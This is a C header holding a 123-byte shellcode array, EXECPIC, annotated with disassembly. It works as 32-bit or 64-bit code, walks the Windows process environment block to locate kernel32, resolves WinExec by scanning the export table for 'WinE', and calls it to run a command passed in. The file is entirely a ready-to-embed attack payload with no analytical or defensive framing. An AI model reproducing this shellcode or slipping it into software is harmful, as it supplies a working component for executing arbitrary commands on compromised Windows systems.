
#define EXECPIC_SIZE 123

char EXECPIC[] = {
  /* 0000 */ "\x53"                         /* push rbx                        */
  /* 0001 */ "\x56"                         /* push rsi                        */
  /* 0002 */ "\x57"                         /* push rdi                        */
  /* 0003 */ "\x55"                         /* push rbp                        */
  /* 0004 */ "\x83\xec\x28"                 /* sub esp, 0x28                   */
  /* 0007 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0009 */ "\x40\x92"                     /* xchg edx, eax                   */
  /* 000B */ "\x74\x1a"                     /* jz 0x27                         */
  /* 000D */ "\x8b\x4c\x24\x3c"             /* mov ecx, [rsp+0x3c]             */
  /* 0011 */ "\x50"                         /* push rax                        */
  /* 0012 */ "\x51"                         /* push rcx                        */
  /* 0013 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:rdx+0x2f]          */
  /* 0017 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001A */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001D */ "\xad"                         /* lodsd                           */
  /* 001E */ "\x8b\x30"                     /* mov esi, [rax]                  */
  /* 0020 */ "\x8b\x7e\x18"                 /* mov edi, [rsi+0x18]             */
  /* 0023 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 0025 */ "\xeb\x17"                     /* jmp 0x3e                        */
  /* 0027 */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 0029 */ "\x65\x48\x8b\x32"             /* mov rsi, [gs:rdx]               */
  /* 002D */ "\x48\x8b\x76\x18"             /* mov rsi, [rsi+0x18]             */
  /* 0031 */ "\x48\x8b\x76\x10"             /* mov rsi, [rsi+0x10]             */
  /* 0035 */ "\x48\xad"                     /* lodsq                           */
  /* 0037 */ "\x48\x8b\x30"                 /* mov rsi, [rax]                  */
  /* 003A */ "\x48\x8b\x7e\x30"             /* mov rdi, [rsi+0x30]             */
  /* 003E */ "\x03\x57\x3c"                 /* add edx, [rdi+0x3c]             */
  /* 0041 */ "\x8b\x5c\x17\x28"             /* mov ebx, [rdi+rdx+0x28]         */
  /* 0045 */ "\x8b\x74\x1f\x20"             /* mov esi, [rdi+rbx+0x20]         */
  /* 0049 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 004C */ "\x8b\x54\x1f\x24"             /* mov edx, [rdi+rbx+0x24]         */
  /* 0050 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [rdi+rdx]       */
  /* 0054 */ "\x48\x8d\x52\x02"             /* lea rdx, [rdx+0x2]              */
  /* 0058 */ "\xad"                         /* lodsd                           */
  /* 0059 */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [rdi+rax], 0x456e6957 */
  /* 0060 */ "\x75\xee"                     /* jnz 0x50                        */
  /* 0062 */ "\x8b\x74\x1f\x1c"             /* mov esi, [rdi+rbx+0x1c]         */
  /* 0066 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 0069 */ "\x8b\x34\xae"                 /* mov esi, [rsi+rbp*4]            */
  /* 006C */ "\x48\x01\xf7"                 /* add rdi, rsi                    */
  /* 006F */ "\x99"                         /* cdq                             */
  /* 0070 */ "\xff\xd7"                     /* call rdi                        */
  /* 0072 */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
  /* 0076 */ "\x5d"                         /* pop rbp                         */
  /* 0077 */ "\x5f"                         /* pop rdi                         */
  /* 0078 */ "\x5e"                         /* pop rsi                         */
  /* 0079 */ "\x5b"                         /* pop rbx                         */
  /* 007A */ "\xc3"                         /* ret                             */
};